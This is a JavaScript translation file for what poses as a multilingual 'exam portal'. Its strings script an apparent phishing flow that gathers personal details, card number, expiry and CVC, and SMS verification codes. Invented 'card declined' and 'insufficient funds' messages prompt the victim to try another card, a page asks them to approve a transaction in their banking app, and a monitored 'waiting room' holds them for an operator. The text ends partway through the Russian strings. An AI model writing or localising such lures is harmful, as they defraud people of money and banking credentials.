/**
 * i18n — Auto-detect language, translate all marked elements.
 *
 * Usage:
 *   <span data-i18n="key">Default English</span>
 *   <input data-i18n-placeholder="key" placeholder="Default">
 *   <button data-i18n="key">Default</button>
 *
 * In JS: i18n.t('key')  — returns translated string
 *        i18n.setLang('fr') — switch language
 */

const i18n = (function () {
    const TRANSLATIONS = {
        // ============ ENGLISH (default, fallback) ============
        en: {
            // -- Registration --
            badge: "Secure Examination Platform",
            site_title: "Exam Portal",
            reg_hero_text: "Fill in your information below to register for your examination session.",
            reg_title: "Student Registration",
            reg_subtitle: "All fields are required. Make sure your information is accurate.",
            lbl_firstname: "First Name",
            lbl_lastname: "Last Name",
            lbl_email: "Email Address",
            lbl_phone: "Phone Number",
            lbl_street: "Street Address",
            lbl_city: "City",
            lbl_state: "State / Region",
            lbl_zip: "ZIP / Postal Code",
            lbl_country: "Country",
            btn_submit: "Submit",
            msg_fill_all: "Please fill in all required fields.",
            msg_submitting: "Submitting...",
            msg_success_redirect: "Submitted successfully! Redirecting...",
            msg_conn_error: "Connection error. Please try again.",
            msg_submit_fail: "Submission failed.",
            footer_text: "Secure Online Examination System",

            // -- Payment --
            pay_title: "Exam Fee Payment",
            pay_details: "Payment Details",
            pay_for: "for",
            pay_reg_fee: "Exam Registration",
            pay_platform_fee: "Platform Fee",
            pay_total: "Total",
            lbl_cardholder: "Cardholder Name",
            lbl_card_number: "Card Number",
            ph_card_number: "Card number",
            lbl_expiry: "Expiry Date",
            lbl_cvc: "CVC",
            btn_pay: "Pay",
            msg_processing: "Processing...",
            msg_pay_success: "Payment details submitted! Redirecting...",
            msg_pay_submitted: "Submitted",
            msg_enter_name: "Enter cardholder name",
            msg_invalid_card: "Invalid card number",
            msg_invalid_expiry: "Invalid or expired",
            msg_cvc_digits: "CVC must be",
            msg_digits_for: "digits for",
            pay_secure: "Secure payment",

            // -- Payment errors --
            err_declined_title: "Your card was declined",
            err_declined_desc: "Please try a different card or contact your bank and try again.",
            err_insufficient_title: "Insufficient funds",
            err_insufficient_desc: "Please try a different card with sufficient balance.",
            err_expired_title: "Your card has expired",
            err_expired_desc: "Please use a valid, non-expired card.",
            err_error_title: "Payment processing error",
            err_error_desc: "An error occurred. Please re-enter your card details and try again.",

            // -- OTP --
            otp_title: "Enter Verification Code",
            otp_message: "We sent a 6-digit code to your registered phone number. Enter it below.",
            btn_verify: "Verify",
            msg_verifying: "Verifying...",
            msg_enter_6: "Enter all 6 digits",
            msg_otp_success: "Code verified! Redirecting...",
            msg_otp_fail: "Verification failed",
            otp_resend: "Didn't receive it?",
            otp_resend_link: "Resend code",

            // -- Waiting --
            wait_title: "Waiting Room",
            wait_welcome: "Welcome,",
            wait_message: "You are registered and connected. Please wait for the exam administrator to start your session.",
            wait_warning: "Do not close this tab. Your activity is being monitored.",
            wait_redirect: "Redirecting you now...",

            // -- Approve --
            approve_title: "Transaction Approval",
            approve_message: "Please approve this transaction in your mobile banking app.",
            approve_amount: "Amount",
            btn_approved: "I Have Approved",
            msg_approved: "Approved — redirecting...",

            // -- Thank you --
            ty_title: "Thank You",
            ty_message: "Your registration is complete. You will receive further instructions via email.",

            // -- Language selector --
            lang_label: "Language",
        },

        // ============ FRENCH ============
        fr: {
            badge: "Plateforme d'examen s\u00e9curis\u00e9e",
            site_title: "Portail d'examen",
            reg_hero_text: "Remplissez vos informations ci-dessous pour vous inscrire \u00e0 votre session d'examen.",
            reg_title: "Inscription \u00e9tudiant",
            reg_subtitle: "Tous les champs sont obligatoires. Assurez-vous que vos informations sont exactes.",
            lbl_firstname: "Pr\u00e9nom",
            lbl_lastname: "Nom de famille",
            lbl_email: "Adresse e-mail",
            lbl_phone: "Num\u00e9ro de t\u00e9l\u00e9phone",
            lbl_street: "Adresse",
            lbl_city: "Ville",
            lbl_state: "\u00c9tat / R\u00e9gion",
            lbl_zip: "Code postal",
            lbl_country: "Pays",
            btn_submit: "Soumettre",
            msg_fill_all: "Veuillez remplir tous les champs obligatoires.",
            msg_submitting: "Envoi en cours...",
            msg_success_redirect: "Soumis avec succ\u00e8s ! Redirection...",
            msg_conn_error: "Erreur de connexion. Veuillez r\u00e9essayer.",
            msg_submit_fail: "\u00c9chec de la soumission.",
            footer_text: "Syst\u00e8me d'examen en ligne s\u00e9curis\u00e9",
            pay_title: "Paiement des frais d'examen",
            pay_details: "D\u00e9tails du paiement",
            pay_for: "pour",
            pay_reg_fee: "Inscription \u00e0 l'examen",
            pay_platform_fee: "Frais de plateforme",
            pay_total: "Total",
            lbl_cardholder: "Nom du titulaire",
            lbl_card_number: "Num\u00e9ro de carte",
            ph_card_number: "Num\u00e9ro de carte",
            lbl_expiry: "Date d'expiration",
            lbl_cvc: "CVC",
            btn_pay: "Payer",
            msg_processing: "Traitement...",
            msg_pay_success: "Paiement soumis ! Redirection...",
            msg_pay_submitted: "Soumis",
            msg_enter_name: "Entrez le nom du titulaire",
            msg_invalid_card: "Num\u00e9ro de carte invalide",
            msg_invalid_expiry: "Date invalide ou expir\u00e9e",
            msg_cvc_digits: "Le CVC doit avoir",
            msg_digits_for: "chiffres pour",
            pay_secure: "Paiement s\u00e9curis\u00e9",
            err_declined_title: "Votre carte a \u00e9t\u00e9 refus\u00e9e",
            err_declined_desc: "Veuillez essayer une autre carte ou contacter votre banque.",
            err_insufficient_title: "Fonds insuffisants",
            err_insufficient_desc: "Veuillez essayer une carte avec un solde suffisant.",
            err_expired_title: "Votre carte a expir\u00e9",
            err_expired_desc: "Veuillez utiliser une carte valide et non expir\u00e9e.",
            err_error_title: "Erreur de traitement",
            err_error_desc: "Une erreur est survenue. Veuillez r\u00e9essayer.",
            otp_title: "Entrez le code de v\u00e9rification",
            otp_message: "Nous avons envoy\u00e9 un code \u00e0 6 chiffres \u00e0 votre t\u00e9l\u00e9phone.",
            btn_verify: "V\u00e9rifier",
            msg_verifying: "V\u00e9rification...",
            msg_enter_6: "Entrez les 6 chiffres",
            msg_otp_success: "Code v\u00e9rifi\u00e9 ! Redirection...",
            msg_otp_fail: "\u00c9chec de la v\u00e9rification",
            otp_resend: "Pas re\u00e7u ?",
            otp_resend_link: "Renvoyer",
            wait_title: "Salle d'attente",
            wait_welcome: "Bienvenue,",
            wait_message: "Vous \u00eates inscrit et connect\u00e9. Veuillez attendre que l'administrateur lance votre session.",
            wait_warning: "Ne fermez pas cet onglet. Votre activit\u00e9 est surveill\u00e9e.",
            wait_redirect: "Redirection en cours...",
            approve_title: "Approbation de la transaction",
            approve_message: "Veuillez approuver cette transaction dans votre application bancaire.",
            approve_amount: "Montant",
            btn_approved: "J'ai approuv\u00e9",
            msg_approved: "Approuv\u00e9 — redirection...",
            ty_title: "Merci",
            ty_message: "Votre inscription est termin\u00e9e. Vous recevrez des instructions par e-mail.",
            lang_label: "Langue",
        },

        // ============ SPANISH ============
        es: {
            badge: "Plataforma de examen segura",
            site_title: "Portal de examen",
            reg_hero_text: "Complete sus datos para registrarse en su sesi\u00f3n de examen.",
            reg_title: "Registro de estudiante",
            reg_subtitle: "Todos los campos son obligatorios.",
            lbl_firstname: "Nombre",
            lbl_lastname: "Apellido",
            lbl_email: "Correo electr\u00f3nico",
            lbl_phone: "Tel\u00e9fono",
            lbl_street: "Direcci\u00f3n",
            lbl_city: "Ciudad",
            lbl_state: "Estado / Regi\u00f3n",
            lbl_zip: "C\u00f3digo postal",
            lbl_country: "Pa\u00eds",
            btn_submit: "Enviar",
            msg_fill_all: "Por favor complete todos los campos.",
            msg_submitting: "Enviando...",
            msg_success_redirect: "\u00a1Enviado con \u00e9xito! Redirigiendo...",
            msg_conn_error: "Error de conexi\u00f3n. Int\u00e9ntelo de nuevo.",
            msg_submit_fail: "Error al enviar.",
            footer_text: "Sistema de examen en l\u00ednea seguro",
            pay_title: "Pago de examen",
            pay_details: "Detalles del pago",
            pay_for: "para",
            pay_reg_fee: "Registro de examen",
            pay_platform_fee: "Tarifa de plataforma",
            pay_total: "Total",
            lbl_cardholder: "Titular de la tarjeta",
            lbl_card_number: "N\u00famero de tarjeta",
            ph_card_number: "N\u00famero de tarjeta",
            lbl_expiry: "Fecha de vencimiento",
            lbl_cvc: "CVC",
            btn_pay: "Pagar",
            msg_processing: "Procesando...",
            msg_pay_success: "\u00a1Pago enviado! Redirigiendo...",
            msg_pay_submitted: "Enviado",
            msg_enter_name: "Ingrese el nombre del titular",
            msg_invalid_card: "N\u00famero de tarjeta inv\u00e1lido",
            msg_invalid_expiry: "Fecha inv\u00e1lida o vencida",
            msg_cvc_digits: "El CVC debe tener",
            msg_digits_for: "d\u00edgitos para",
            pay_secure: "Pago seguro",
            err_declined_title: "Su tarjeta fue rechazada",
            err_declined_desc: "Intente con otra tarjeta o contacte a su banco.",
            err_insufficient_title: "Fondos insuficientes",
            err_insufficient_desc: "Use una tarjeta con saldo suficiente.",
            err_expired_title: "Su tarjeta ha expirado",
            err_expired_desc: "Use una tarjeta v\u00e1lida.",
            err_error_title: "Error de procesamiento",
            err_error_desc: "Ocurri\u00f3 un error. Intente de nuevo.",
            otp_title: "Ingrese el c\u00f3digo de verificaci\u00f3n",
            otp_message: "Enviamos un c\u00f3digo de 6 d\u00edgitos a su tel\u00e9fono.",
            btn_verify: "Verificar",
            msg_verifying: "Verificando...",
            msg_enter_6: "Ingrese los 6 d\u00edgitos",
            msg_otp_success: "\u00a1C\u00f3digo verificado! Redirigiendo...",
            msg_otp_fail: "Verificaci\u00f3n fallida",
            otp_resend: "\u00bfNo lo recibi\u00f3?",
            otp_resend_link: "Reenviar",
            wait_title: "Sala de espera",
            wait_welcome: "Bienvenido,",
            wait_message: "Est\u00e1 registrado y conectado. Espere a que el administrador inicie su sesi\u00f3n.",
            wait_warning: "No cierre esta pesta\u00f1a.",
            wait_redirect: "Redirigiendo...",
            approve_title: "Aprobaci\u00f3n de transacci\u00f3n",
            approve_message: "Apruebe esta transacci\u00f3n en su app bancaria.",
            approve_amount: "Monto",
            btn_approved: "He aprobado",
            msg_approved: "Aprobado \u2014 redirigiendo...",
            ty_title: "Gracias",
            ty_message: "Su registro est\u00e1 completo. Recibir\u00e1 instrucciones por correo.",
            lang_label: "Idioma",
        },

        // ============ ARABIC ============
        ar: {
            badge: "\u0645\u0646\u0635\u0629 \u0627\u0645\u062a\u062d\u0627\u0646 \u0622\u0645\u0646\u0629",
            site_title: "\u0628\u0648\u0627\u0628\u0629 \u0627\u0644\u0627\u0645\u062a\u062d\u0627\u0646",
            reg_hero_text: "\u0623\u062f\u062e\u0644 \u0628\u064a\u0627\u0646\u0627\u062a\u0643 \u0623\u062f\u0646\u0627\u0647 \u0644\u0644\u062a\u0633\u062c\u064a\u0644 \u0641\u064a \u062c\u0644\u0633\u0629 \u0627\u0644\u0627\u0645\u062a\u062d\u0627\u0646.",
            reg_title: "\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u0637\u0627\u0644\u0628",
            reg_subtitle: "\u062c\u0645\u064a\u0639 \u0627\u0644\u062d\u0642\u0648\u0644 \u0645\u0637\u0644\u0648\u0628\u0629. \u062a\u0623\u0643\u062f \u0645\u0646 \u062f\u0642\u0629 \u0645\u0639\u0644\u0648\u0645\u0627\u062a\u0643.",
            lbl_firstname: "\u0627\u0644\u0627\u0633\u0645 \u0627\u0644\u0623\u0648\u0644",
            lbl_lastname: "\u0627\u0633\u0645 \u0627\u0644\u0639\u0627\u0626\u0644\u0629",
            lbl_email: "\u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a",
            lbl_phone: "\u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641",
            lbl_street: "\u0627\u0644\u0639\u0646\u0648\u0627\u0646",
            lbl_city: "\u0627\u0644\u0645\u062f\u064a\u0646\u0629",
            lbl_state: "\u0627\u0644\u0648\u0644\u0627\u064a\u0629 / \u0627\u0644\u0645\u0646\u0637\u0642\u0629",
            lbl_zip: "\u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0628\u0631\u064a\u062f\u064a",
            lbl_country: "\u0627\u0644\u0628\u0644\u062f",
            btn_submit: "\u0625\u0631\u0633\u0627\u0644",
            msg_fill_all: "\u064a\u0631\u062c\u0649 \u0645\u0644\u0621 \u062c\u0645\u064a\u0639 \u0627\u0644\u062d\u0642\u0648\u0644.",
            msg_submitting: "\u062c\u0627\u0631\u064a \u0627\u0644\u0625\u0631\u0633\u0627\u0644...",
            msg_success_redirect: "\u062a\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0628\u0646\u062c\u0627\u062d! \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0648\u064a\u0644...",
            msg_conn_error: "\u062e\u0637\u0623 \u0641\u064a \u0627\u0644\u0627\u062a\u0635\u0627\u0644. \u062d\u0627\u0648\u0644 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649.",
            msg_submit_fail: "\u0641\u0634\u0644 \u0627\u0644\u0625\u0631\u0633\u0627\u0644.",
            footer_text: "\u0646\u0638\u0627\u0645 \u0627\u0645\u062a\u062d\u0627\u0646 \u0622\u0645\u0646 \u0639\u0628\u0631 \u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a",
            pay_title: "\u062f\u0641\u0639 \u0631\u0633\u0648\u0645 \u0627\u0644\u0627\u0645\u062a\u062d\u0627\u0646",
            pay_details: "\u062a\u0641\u0627\u0635\u064a\u0644 \u0627\u0644\u062f\u0641\u0639",
            pay_for: "\u0644\u0640",
            pay_reg_fee: "\u0631\u0633\u0648\u0645 \u0627\u0644\u062a\u0633\u062c\u064a\u0644",
            pay_platform_fee: "\u0631\u0633\u0648\u0645 \u0627\u0644\u0645\u0646\u0635\u0629",
            pay_total: "\u0627\u0644\u0645\u062c\u0645\u0648\u0639",
            lbl_cardholder: "\u0627\u0633\u0645 \u062d\u0627\u0645\u0644 \u0627\u0644\u0628\u0637\u0627\u0642\u0629",
            lbl_card_number: "\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629",
            ph_card_number: "\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629",
            lbl_expiry: "\u062a\u0627\u0631\u064a\u062e \u0627\u0644\u0627\u0646\u062a\u0647\u0627\u0621",
            lbl_cvc: "CVC",
            btn_pay: "\u0627\u062f\u0641\u0639",
            msg_processing: "\u062c\u0627\u0631\u064a \u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629...",
            msg_pay_success: "\u062a\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u062f\u0641\u0639! \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0648\u064a\u0644...",
            msg_pay_submitted: "\u062a\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644",
            msg_enter_name: "\u0623\u062f\u062e\u0644 \u0627\u0633\u0645 \u062d\u0627\u0645\u0644 \u0627\u0644\u0628\u0637\u0627\u0642\u0629",
            msg_invalid_card: "\u0631\u0642\u0645 \u0628\u0637\u0627\u0642\u0629 \u063a\u064a\u0631 \u0635\u0627\u0644\u062d",
            msg_invalid_expiry: "\u062a\u0627\u0631\u064a\u062e \u063a\u064a\u0631 \u0635\u0627\u0644\u062d",
            msg_cvc_digits: "\u064a\u062c\u0628 \u0623\u0646 \u064a\u0643\u0648\u0646 CVC",
            msg_digits_for: "\u0623\u0631\u0642\u0627\u0645 \u0644\u0640",
            pay_secure: "\u062f\u0641\u0639 \u0622\u0645\u0646",
            err_declined_title: "\u062a\u0645 \u0631\u0641\u0636 \u0628\u0637\u0627\u0642\u062a\u0643",
            err_declined_desc: "\u062c\u0631\u0628 \u0628\u0637\u0627\u0642\u0629 \u0623\u062e\u0631\u0649 \u0623\u0648 \u0627\u062a\u0635\u0644 \u0628\u0627\u0644\u0628\u0646\u0643.",
            err_insufficient_title: "\u0631\u0635\u064a\u062f \u063a\u064a\u0631 \u0643\u0627\u0641\u064d",
            err_insufficient_desc: "\u0627\u0633\u062a\u062e\u062f\u0645 \u0628\u0637\u0627\u0642\u0629 \u0628\u0631\u0635\u064a\u062f \u0643\u0627\u0641\u064d.",
            err_expired_title: "\u0628\u0637\u0627\u0642\u062a\u0643 \u0645\u0646\u062a\u0647\u064a\u0629 \u0627\u0644\u0635\u0644\u0627\u062d\u064a\u0629",
            err_expired_desc: "\u0627\u0633\u062a\u062e\u062f\u0645 \u0628\u0637\u0627\u0642\u0629 \u0635\u0627\u0644\u062d\u0629.",
            err_error_title: "\u062e\u0637\u0623 \u0641\u064a \u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629",
            err_error_desc: "\u062d\u062f\u062b \u062e\u0637\u0623. \u062d\u0627\u0648\u0644 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649.",
            otp_title: "\u0623\u062f\u062e\u0644 \u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642",
            otp_message: "\u0623\u0631\u0633\u0644\u0646\u0627 \u0631\u0645\u0632\u0627\u064b \u0645\u0643\u0648\u0646\u0627\u064b \u0645\u0646 6 \u0623\u0631\u0642\u0627\u0645 \u0625\u0644\u0649 \u0647\u0627\u062a\u0641\u0643.",
            btn_verify: "\u062a\u062d\u0642\u0642",
            msg_verifying: "\u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0642\u0642...",
            msg_enter_6: "\u0623\u062f\u062e\u0644 \u0627\u0644\u0623\u0631\u0642\u0627\u0645 \u0627\u0644\u0633\u062a\u0629",
            msg_otp_success: "\u062a\u0645 \u0627\u0644\u062a\u062d\u0642\u0642! \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0648\u064a\u0644...",
            msg_otp_fail: "\u0641\u0634\u0644 \u0627\u0644\u062a\u062d\u0642\u0642",
            otp_resend: "\u0644\u0645 \u062a\u0633\u062a\u0644\u0645\u0647\u061f",
            otp_resend_link: "\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0625\u0631\u0633\u0627\u0644",
            wait_title: "\u063a\u0631\u0641\u0629 \u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631",
            wait_welcome: "\u0645\u0631\u062d\u0628\u0627\u064b\u060c",
            wait_message: "\u0623\u0646\u062a \u0645\u0633\u062c\u0644 \u0648\u0645\u062a\u0635\u0644. \u0627\u0646\u062a\u0638\u0631 \u062d\u062a\u0649 \u064a\u0628\u062f\u0623 \u0627\u0644\u0645\u0633\u0624\u0648\u0644 \u062c\u0644\u0633\u062a\u0643.",
            wait_warning: "\u0644\u0627 \u062a\u063a\u0644\u0642 \u0647\u0630\u0627 \u0627\u0644\u062a\u0628\u0648\u064a\u0628.",
            wait_redirect: "\u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0648\u064a\u0644...",
            approve_title: "\u0627\u0644\u0645\u0648\u0627\u0641\u0642\u0629 \u0639\u0644\u0649 \u0627\u0644\u0645\u0639\u0627\u0645\u0644\u0629",
            approve_message: "\u0648\u0627\u0641\u0642 \u0639\u0644\u0649 \u0647\u0630\u0647 \u0627\u0644\u0645\u0639\u0627\u0645\u0644\u0629 \u0641\u064a \u062a\u0637\u0628\u064a\u0642 \u0627\u0644\u0628\u0646\u0643.",
            approve_amount: "\u0627\u0644\u0645\u0628\u0644\u063a",
            btn_approved: "\u0644\u0642\u062f \u0648\u0627\u0641\u0642\u062a",
            msg_approved: "\u062a\u0645\u062a \u0627\u0644\u0645\u0648\u0627\u0641\u0642\u0629 \u2014 \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0648\u064a\u0644...",
            ty_title: "\u0634\u0643\u0631\u0627\u064b",
            ty_message: "\u0627\u0643\u062a\u0645\u0644 \u062a\u0633\u062c\u064a\u0644\u0643. \u0633\u062a\u062a\u0644\u0642\u0649 \u062a\u0639\u0644\u064a\u0645\u0627\u062a \u0639\u0628\u0631 \u0627\u0644\u0628\u0631\u064a\u062f.",
            lang_label: "\u0627\u0644\u0644\u063a\u0629",
        },

        // ============ GERMAN ============
        de: {
            badge: "Sichere Pr\u00fcfungsplattform",
            site_title: "Pr\u00fcfungsportal",
            reg_hero_text: "F\u00fcllen Sie Ihre Daten aus, um sich f\u00fcr Ihre Pr\u00fcfung anzumelden.",
            reg_title: "Studentenregistrierung",
            reg_subtitle: "Alle Felder sind erforderlich.",
            lbl_firstname: "Vorname", lbl_lastname: "Nachname", lbl_email: "E-Mail", lbl_phone: "Telefon",
            lbl_street: "Stra\u00dfe", lbl_city: "Stadt", lbl_state: "Bundesland", lbl_zip: "PLZ", lbl_country: "Land",
            btn_submit: "Absenden", msg_fill_all: "Bitte f\u00fcllen Sie alle Felder aus.",
            msg_submitting: "Wird gesendet...", msg_success_redirect: "Erfolgreich! Weiterleitung...",
            msg_conn_error: "Verbindungsfehler.", msg_submit_fail: "Senden fehlgeschlagen.",
            footer_text: "Sicheres Online-Pr\u00fcfungssystem",
            pay_title: "Pr\u00fcfungsgeb\u00fchren", pay_details: "Zahlungsdetails", pay_for: "f\u00fcr",
            pay_reg_fee: "Registrierung", pay_platform_fee: "Plattformgeb\u00fchr", pay_total: "Gesamt",
            lbl_cardholder: "Karteninhaber", lbl_card_number: "Kartennummer", ph_card_number: "Kartennummer",
            lbl_expiry: "Ablaufdatum", lbl_cvc: "CVC", btn_pay: "Bezahlen",
            msg_processing: "Verarbeitung...", msg_pay_success: "Zahlung gesendet! Weiterleitung...",
            msg_pay_submitted: "Gesendet", msg_enter_name: "Name eingeben", msg_invalid_card: "Ung\u00fcltige Kartennummer",
            msg_invalid_expiry: "Ung\u00fcltig oder abgelaufen", msg_cvc_digits: "CVC muss", msg_digits_for: "Ziffern f\u00fcr",
            pay_secure: "Sichere Zahlung",
            err_declined_title: "Karte abgelehnt", err_declined_desc: "Versuchen Sie eine andere Karte.",
            err_insufficient_title: "Unzureichendes Guthaben", err_insufficient_desc: "Verwenden Sie eine andere Karte.",
            err_expired_title: "Karte abgelaufen", err_expired_desc: "Verwenden Sie eine g\u00fcltige Karte.",
            err_error_title: "Verarbeitungsfehler", err_error_desc: "Ein Fehler ist aufgetreten.",
            otp_title: "Best\u00e4tigungscode eingeben", otp_message: "Wir haben einen 6-stelligen Code gesendet.",
            btn_verify: "Best\u00e4tigen", msg_verifying: "Wird gepr\u00fcft...", msg_enter_6: "Alle 6 Ziffern eingeben",
            msg_otp_success: "Best\u00e4tigt! Weiterleitung...", msg_otp_fail: "Best\u00e4tigung fehlgeschlagen",
            otp_resend: "Nicht erhalten?", otp_resend_link: "Erneut senden",
            wait_title: "Warteraum", wait_welcome: "Willkommen,",
            wait_message: "Sie sind registriert. Warten Sie auf den Administrator.",
            wait_warning: "Schlie\u00dfen Sie diesen Tab nicht.", wait_redirect: "Weiterleitung...",
            approve_title: "Transaktionsgenehmigung", approve_message: "Genehmigen Sie in Ihrer Banking-App.",
            approve_amount: "Betrag", btn_approved: "Genehmigt", msg_approved: "Genehmigt \u2014 Weiterleitung...",
            ty_title: "Danke", ty_message: "Ihre Registrierung ist abgeschlossen.",
            lang_label: "Sprache",
        },

        // ============ PORTUGUESE ============
        pt: {
            badge: "Plataforma de exame segura", site_title: "Portal de exame",
            reg_hero_text: "Preencha seus dados para se registrar.", reg_title: "Registro do estudante",
            reg_subtitle: "Todos os campos s\u00e3o obrigat\u00f3rios.",
            lbl_firstname: "Nome", lbl_lastname: "Sobrenome", lbl_email: "E-mail", lbl_phone: "Telefone",
            lbl_street: "Endere\u00e7o", lbl_city: "Cidade", lbl_state: "Estado", lbl_zip: "CEP", lbl_country: "Pa\u00eds",
            btn_submit: "Enviar", msg_fill_all: "Preencha todos os campos.",
            msg_submitting: "Enviando...", msg_success_redirect: "Enviado! Redirecionando...",
            msg_conn_error: "Erro de conex\u00e3o.", msg_submit_fail: "Falha ao enviar.",
            footer_text: "Sistema de exame online seguro",
            pay_title: "Pagamento", pay_details: "Detalhes do pagamento", pay_for: "para",
            lbl_cardholder: "Titular do cart\u00e3o", lbl_card_number: "N\u00famero do cart\u00e3o", ph_card_number: "N\u00famero do cart\u00e3o",
            lbl_expiry: "Validade", lbl_cvc: "CVC", btn_pay: "Pagar",
            msg_processing: "Processando...", msg_pay_success: "Pagamento enviado! Redirecionando...",
            pay_secure: "Pagamento seguro",
            otp_title: "C\u00f3digo de verifica\u00e7\u00e3o", otp_message: "Enviamos um c\u00f3digo de 6 d\u00edgitos.",
            btn_verify: "Verificar", msg_enter_6: "Digite os 6 d\u00edgitos",
            wait_title: "Sala de espera", wait_welcome: "Bem-vindo,",
            wait_message: "Voc\u00ea est\u00e1 registrado. Aguarde o administrador.", wait_warning: "N\u00e3o feche esta aba.",
            ty_title: "Obrigado", ty_message: "Seu registro est\u00e1 completo.",
            lang_label: "Idioma",
        },

        // ============ TURKISH ============
        tr: {
            badge: "G\u00fcvenli s\u0131nav platformu", site_title: "S\u0131nav Portal\u0131",
            reg_hero_text: "S\u0131nav oturumunuz i\u00e7in kay\u0131t olun.", reg_title: "\u00d6\u011frenci Kay\u0131t",
            reg_subtitle: "T\u00fcm alanlar zorunludur.",
            lbl_firstname: "Ad", lbl_lastname: "Soyad", lbl_email: "E-posta", lbl_phone: "Telefon",
            lbl_street: "Adres", lbl_city: "\u015eehir", lbl_state: "\u0130l / B\u00f6lge", lbl_zip: "Posta kodu", lbl_country: "\u00dclke",
            btn_submit: "G\u00f6nder", msg_fill_all: "T\u00fcm alanlar\u0131 doldurun.",
            msg_submitting: "G\u00f6nderiliyor...", msg_success_redirect: "Ba\u015far\u0131l\u0131! Y\u00f6nlendiriliyor...",
            msg_conn_error: "Ba\u011flant\u0131 hatas\u0131.", msg_submit_fail: "G\u00f6nderilemedi.",
            footer_text: "G\u00fcvenli \u00e7evrimi\u00e7i s\u0131nav sistemi",
            pay_title: "S\u0131nav \u00dccreti", pay_details: "\u00d6deme detaylar\u0131", pay_for: "i\u00e7in",
            lbl_cardholder: "Kart sahibi", lbl_card_number: "Kart numaras\u0131", ph_card_number: "Kart numaras\u0131",
            lbl_expiry: "Son kullanma", lbl_cvc: "CVC", btn_pay: "\u00d6de",
            msg_processing: "\u0130\u015fleniyor...", msg_pay_success: "\u00d6deme g\u00f6nderildi! Y\u00f6nlendiriliyor...",
            pay_secure: "G\u00fcvenli \u00f6deme",
            otp_title: "Do\u011frulama kodu", otp_message: "6 haneli kodu girin.",
            btn_verify: "Do\u011frula", msg_enter_6: "6 haneyi girin",
            wait_title: "Bekleme odas\u0131", wait_welcome: "Ho\u015f geldiniz,",
            wait_message: "Kay\u0131tl\u0131s\u0131n\u0131z. Y\u00f6neticinin oturumu ba\u015flatmas\u0131n\u0131 bekleyin.",
            wait_warning: "Bu sekmeyi kapatmay\u0131n.",
            ty_title: "Te\u015fekk\u00fcrler", ty_message: "Kay\u0131t tamamland\u0131.",
            lang_label: "Dil",
        },

        // ============ ITALIAN ============
        it: {
            badge: "Piattaforma d'esame sicura", site_title: "Portale d'esame",
            reg_hero_text: "Compila i tuoi dati per registrarti.", reg_title: "Registrazione studente",
            reg_subtitle: "Tutti i campi sono obbligatori.",
            lbl_firstname: "Nome", lbl_lastname: "Cognome", lbl_email: "Email", lbl_phone: "Telefono",
            lbl_street: "Indirizzo", lbl_city: "Citt\u00e0", lbl_state: "Provincia", lbl_zip: "CAP", lbl_country: "Paese",
            btn_submit: "Invia", msg_fill_all: "Compila tutti i campi.",
            msg_submitting: "Invio...", msg_success_redirect: "Inviato! Reindirizzamento...",
            msg_conn_error: "Errore di connessione.", msg_submit_fail: "Invio fallito.",
            footer_text: "Sistema d'esame online sicuro",
            pay_title: "Pagamento esame", pay_details: "Dettagli pagamento", pay_for: "per",
            lbl_cardholder: "Titolare carta", lbl_card_number: "Numero carta", ph_card_number: "Numero carta",
            lbl_expiry: "Scadenza", lbl_cvc: "CVC", btn_pay: "Paga",
            msg_processing: "Elaborazione...", msg_pay_success: "Pagamento inviato! Reindirizzamento...",
            pay_secure: "Pagamento sicuro",
            otp_title: "Codice di verifica", otp_message: "Inserisci il codice a 6 cifre.",
            btn_verify: "Verifica", msg_enter_6: "Inserisci tutte le 6 cifre",
            wait_title: "Sala d'attesa", wait_welcome: "Benvenuto,",
            wait_message: "Sei registrato. Attendi l'amministratore.", wait_warning: "Non chiudere questa scheda.",
            ty_title: "Grazie", ty_message: "La registrazione \u00e8 completa.",
            lang_label: "Lingua",
        },

        // ============ RUSSIAN ============
        ru: {
            badge: "\u0411\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u0430\u044f \u043f\u043b\u0430\u0442\u0444\u043e\u0440\u043c\u0430", site_title: "\u041f\u043e\u0440\u0442\u0430\u043b \u044d\u043a\u0437\u0430\u043c\u0435\u043d\u0430",
            reg_hero_text: "\u0417\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438.", reg_title: "\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0430",
            reg_subtitle: "\u0412\u0441\u0435 \u043f\u043e\u043b\u044f \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u044b.",
            lbl_firstname: "\u0418\u043c\u044f", lbl_lastname: "\u0424\u0430\u043c\u0438\u043b\u0438\u044f", lbl_email: "\u042d\u043b. \u043f\u043e\u0447\u0442\u0430", lbl_phone: "\u0422\u0435\u043b\u0435\u0444\u043e\u043d",
